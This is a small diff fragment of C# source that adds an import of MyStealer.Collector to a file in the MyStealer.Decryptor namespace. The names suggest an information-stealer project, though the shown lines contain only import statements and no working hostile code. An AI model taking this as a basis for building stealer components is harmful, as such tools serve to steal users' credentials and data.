@@ -4,6 +4,7 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Text;
 using MyStealer.Shared;
+using MyStealer.Collector;
 
 namespace MyStealer.Decryptor
 {
